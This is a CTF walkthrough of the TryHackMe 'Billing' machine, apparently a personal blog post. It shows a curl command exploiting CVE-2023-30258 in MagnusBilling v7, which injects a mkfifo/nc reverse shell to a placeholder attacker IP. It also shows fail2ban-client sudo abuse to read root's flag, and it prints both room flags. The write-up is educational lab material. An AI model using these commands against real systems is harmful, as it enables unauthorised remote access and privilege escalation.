---
title: 'Billing — THM WriteUp'
date: 'Jun 5, 2025'
description: 'Some mistakes can be costly.'
category: 'Walkthrough'
cover: 'https://i.postimg.cc/hPdsgRCg/0-3IYQlzi-Li-T1b-W0iv.webp'
tags: ['Thm', 'Writeup', 'Billing', 'Pentesting', 'Tryhackme Writeup']
---

## What is user.txt?

I haven’t played CTFs for a long time, so I’m a bit green, but by chance today I got into THM and saw the Billing machine so I decided to dare to do it. So, how did this work?

Port scanning:

```
$ sudo nmap -p- -sCV -vvv -oN nmap-report.txt 10.10.105.159
...
Discovered open port 3306/tcp on 10.10.105.159
Discovered open port 22/tcp on 10.10.105.159
Discovered open port 80/tcp on 10.10.105.159
```

On port 80 we find this web page:

![](https://i.postimg.cc/brj1Wb0Z/1-3TZ0YVvcv-Tph8OEAk-Zjj-Aw.webp)

When scanning with the dirsearch tool we found a README and when we read it we see that the server is running a program called MagnusBilling with version 7.

![](https://i.postimg.cc/zfgbNvGw/1-76dhp8v2s-COg-f4OPFl-ZPw.webp)

With a quick search, we see that there is a [repository with an exploit for this version](https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit).

And reading its readme, it tells us to exploit the vulnerability by executing the script or directly this command from our terminal:

```
curl -s 'http://<TARGET_IP>/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f;'
```

So we open a listening port using nc, pass the parameters and get a shell:

![](https://i.postimg.cc/13N5nTh2/1-mu-Awb-VHu6j-OTmqtl9bjs-KA.webp)

Now, we will simply navigate to the magnus user’s home folder and find the user.txt flag:

![](https://i.postimg.cc/3rSKL73t/1-j-Bd-Iz-Ncsf-Hk26-q-PTbr2pg.webp)

**Flag**: THM{4a6831d5f124b25eefb1e92e0f0da4ca}

---

## What is root.txt?

When executing our star command sudo -l we get a very valuable piece of information:

```
$ sudo -l
Matching Defaults entries for asterisk on ip-10-10-105-159:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-10-105-159:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

That’s it! Now we just search for [gtfobins for our executable](https://gtfobins.github.io/#fail2ban) and…

![](https://i.postimg.cc/XNCbg5D7/1-Km-LAoi-Dj9Z09-r-SLJi-TTA.webp)

And it is not registered so we will have to be a little more creative to get a shell.

After a while trying useless commands and learning what the application is for I find myself among many searches with the [following script](https://vulners.com/packetstorm/PACKETSTORM:189989).

![](https://i.postimg.cc/28rKBBpq/1-6y-JUJc4q-Yea0y-ZOgg-WGtug.webp)

If we read the code, it explains a little of the steps that the script performs and the commands that we must execute if we want to breach it on our own via terminal. These commands are:

```
$ sudo /usr/bin/fail2ban-client restart
$ sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'" 
$ sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```

And once these commands have been executed, we will simply go to the /tmp directory and find the flag:

![](https://i.postimg.cc/nrkT1TyS/1-TXb-z-JQbja2o-BR6Lzu62-g.webp)

**Flag**: THM{33ad5b530e71a172648f424ec23fae60}

---

![](https://i.postimg.cc/CKqN2Fy2/1-Mjc5APq-Bvl-LA2TUKUk0FYQ.webp)

Carlos <3